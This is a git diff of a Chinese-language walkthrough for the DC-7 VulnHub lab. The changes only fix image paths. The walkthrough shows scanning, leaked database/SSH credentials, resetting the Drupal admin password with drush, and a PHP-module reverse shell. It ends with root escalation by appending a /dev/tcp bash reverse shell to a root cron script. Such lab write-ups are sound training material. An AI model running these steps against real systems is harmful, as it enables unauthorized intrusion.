@@ -16,7 +16,7 @@
 
 当然，如果想要模拟真实渗透，可以使用`nmap`等扫描工具
 
-![](D:\stu\vulnhub\DC靶场\pic-7\1.jpg)
+![](./pic-7/1.jpg)
 
 # 信息收集 
 
@@ -28,17 +28,17 @@
 nmap -sV -O 192.168.10.13 -p-
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\2.jpg)
+![](./pic-7/2.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，发现这个CMS之前见过，是`drupal`，不过这里给出的话有点东西，下面翻译看看
 
-![](D:\stu\vulnhub\DC靶场\pic-7\3.jpg)
+![](./pic-7/3.jpg)
 
 把这段话翻译，然后以图片来看，应该更直观
 
-![](D:\stu\vulnhub\DC靶场\pic-7\4.jpg)
+![](./pic-7/4.jpg)
 
 使用`whatweb`进一步确定`drupal`是否正确
 
@@ -46,47 +46,47 @@ nmap -sV -O 192.168.10.13 -p-
 whatweb http://192.168.10.13
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\5.jpg)
+![](./pic-7/5.jpg)
 
 这里看到是`drupal 8`在之前的`DC-1`靶场中是`drupal 7`版本，然后通过`msf`进行的攻击
 
 但是这里不行，按照提示，虽然进行爆破没有什么用，但是还是进行一下目录扫描，不过这次感觉东西是真多，之前并未出现这种情况，感觉是作者为了再次的提醒一样，这里放一张图吧，是放在那里进行好久的目录爆破
 
-![](D:\stu\vulnhub\DC靶场\pic-7\6.jpg)
+![](./pic-7/6.jpg)
 
 # 漏洞寻找
 
 再使用`burp`等工具尝试对登录进行一个爆破，发现若长时间的爆破，会使得其进行了限制，注意，这里是对账号进行的限制
 
-![](D:\stu\vulnhub\DC靶场\pic-7\5-2.jpg)
+![](./pic-7/5-2.jpg)
 
 尝试获取`js`代码，测试有无这方面的，但是发现基本上都是调用外部`js`，无用处
 
 在发现的搜索处进行各种注入测试，发现也是不行，使用`sqlmap`测试，发现也是不行
 
-![](D:\stu\vulnhub\DC靶场\pic-7\5-3.jpg)
+![](./pic-7/5-3.jpg)
 
 抓取每个请求的数据包，发现也是无内容，那么尝试搜搜，看能否有源码之类的泄露，尝试直接搜索`drupal 8`，但是想到这里都是纯净的原始状态，除非进行代码审计，去把其中的代码进行分析，然后找出漏洞
 
 啧，再找找。在网站的底部，发现一串字符，想来，平常这种位置，一般也是邮箱偏多，这种形式，还真是少见的，尝试对这个进行搜索`@DC7USER`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\6.jpg)
+![](./pic-7/6.jpg)
 
 # 源码泄露
 
 因为靶机属于国外的作者所制作，所以，这里建议采用`google`进行搜索，可以明确的看到，在`github`有项目
 
-![](D:\stu\vulnhub\DC靶场\pic-7\7.jpg)
+![](./pic-7/7.jpg)
 
 查看该项目，可以看到，`readme`文件，给出了方向，说明找对了方向
 
-![](D:\stu\vulnhub\DC靶场\pic-7\8.jpg)
+![](./pic-7/8.jpg)
 
 在众多代码中，我们要么就是进行代码审计，要么就是寻找配置文件
 
 查看`config.php`文件，发现关键信息，项目地址`https://github.com/Dc7User/staffdb/blob/master/config.php`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\9.jpg)
+![](./pic-7/9.jpg)
 
 连接数据库的用户名`dc7user`和密码`MdR3xOgB7#dW`
 
@@ -96,23 +96,23 @@ whatweb http://192.168.10.13
 
 还有`ssh`服务，尝试进行登录，登录成功
 
-![](D:\stu\vulnhub\DC靶场\pic-7\10.jpg)
+![](./pic-7/10.jpg)
 
 # 提权点寻找
 
 查看当前目录下的文件`mbox`，发现好多信息
 
-![](D:\stu\vulnhub\DC靶场\pic-7\11.jpg)
+![](./pic-7/11.jpg)
 
 到备份数据库数据的目录下，查看，发现数据大小为0
 
-![](D:\stu\vulnhub\DC靶场\pic-7\12.jpg)
+![](./pic-7/12.jpg)
 
 那么查看其中的备份脚本，看以所属者和所属组，以及脚本内容，好家伙，是`gpg`加密，但是文件无内容，并且尝试解密，也是只有`gpg: decrypt_message failed: Unknown system error`
 
 并且这个脚本所属组是`www-data`，加入脚本可以修改或者使用临时环境变量，也都无法提权至`root`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\13.jpg)
+![](./pic-7/13.jpg)
 
 # 错误的提权
 
@@ -122,7 +122,7 @@ whatweb http://192.168.10.13
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\14.jpg)
+![](./pic-7/14.jpg)
 
 这里与前面的`mbox`文件中的信息提到的一样，还是再确定一下版本
 
@@ -130,15 +130,15 @@ find / -perm -4000 -print 2>/dev/null
 /usr/sbin/exim4 --version
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\15.jpg)
+![](./pic-7/15.jpg)
 
 在`kali`中使用`searchsploit`搜索对应的版本漏洞，并复制到当前目录下
 
-![](D:\stu\vulnhub\DC靶场\pic-7\16.jpg)
+![](./pic-7/16.jpg)
 
 如果忘了用法，这里再查看这个脚本即可，脚本文件名加上后面两种即可
 
-![](D:\stu\vulnhub\DC靶场\pic-7\17.jpg)
+![](./pic-7/17.jpg)
 
 然后把这个脚本上传到靶机，可以使用`python`配合`wget`或者直接使用`scp`，因为这里是以`ssh`连接
 
@@ -146,11 +146,11 @@ find / -perm -4000 -print 2>/dev/null
 scp ./46996.sh dc7user@192.168.10.13:/tmp
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\18.jpg)
+![](./pic-7/18.jpg)
 
 这里还可以看到，该脚本具有执行权限，直接执行，但是发现不行
 
-![](D:\stu\vulnhub\DC靶场\pic-7\19.jpg)
+![](./pic-7/19.jpg)
 
 # 正确的提权方向
 
@@ -162,7 +162,7 @@ scp ./46996.sh dc7user@192.168.10.13:/tmp
 
 这里我在`/var/www/html`中找到配置文件`settings.php`，发现其中连接数据库的账号与密码
 
-![](D:\stu\vulnhub\DC靶场\pic-7\20.jpg)
+![](./pic-7/20.jpg)
 
 但是连接数据库后，发现这里面只是记录网站访问等一些信息，并没有用户信息保存在这里
 
@@ -202,7 +202,7 @@ drush user-list
 drush user-password admin --password=123
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\21.jpg)
+![](./pic-7/21.jpg)
 
 登录网站，为什么，因为根据备份文件，要获取`www-data`的身份
 
@@ -216,11 +216,11 @@ drush user-password admin --password=123
 https://www.drupal.org/project/project_module
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\22.jpg)
+![](./pic-7/22.jpg)
 
 但是这里我原本打算，把模块文件下载到`kali`中，然后修改其中的内容，但是发现本地无法上传成功，不管有无修改，这个方式都不行
 
-![](D:\stu\vulnhub\DC靶场\pic-7\23.jpg)
+![](./pic-7/23.jpg)
 
 ## 获取www-data的反弹1shell
 
@@ -238,7 +238,7 @@ For example: https://ftp.drupal.org/files/projects/name.tar.gz
 https://www.drupal.org/project/php/releases/8.x-1.0
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\24.jpg)
+![](./pic-7/24.jpg)
 
 然后构造链接，从URL下载
 
@@ -246,19 +246,19 @@ https://www.drupal.org/project/php/releases/8.x-1.0
 https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-7\25.jpg)
+![](./pic-7/25.jpg)
 
 然后在扩展列表界面，下滑，找到`php filter`，把这个勾选上，然后再下滑到最后，点击`install`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\26.jpg)
+![](./pic-7/26.jpg)
 
 成功启动
 
-![](D:\stu\vulnhub\DC靶场\pic-7\27.jpg)
+![](./pic-7/27.jpg)
 
 打开一个文章，然后对其进行编辑，可以发现，可以更改其为`php`代码的形式
 
-![](D:\stu\vulnhub\DC靶场\pic-7\28.jpg)
+![](./pic-7/28.jpg)
 
 那么新建一个文章，然后使用`php`格式，然后进行保存
 
@@ -277,7 +277,7 @@ nc -lvvp 9999
 
 获取到`www-data`的`bash`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\30.jpg)
+![](./pic-7/30.jpg)
 
 # 提权至root
 
@@ -289,11 +289,11 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/8888 0>&1'" >> backups.sh
 
 如果，这条命令不行，就可以在`https://forum.ywhack.com/shell.php`测试合适的，添加就是了
 
-![](D:\stu\vulnhub\DC靶场\pic-7\31.jpg)
+![](./pic-7/31.jpg)
 
 查看`flag`
 
-![](D:\stu\vulnhub\DC靶场\pic-7\32.jpg)
+![](./pic-7/32.jpg)
 
 > 这里补充说一下，对于脚本backups.sh，修改后，不要执行，一旦执行，是以当前用户的身份，也就是`www-data`执行的，是无法提权的。
 >
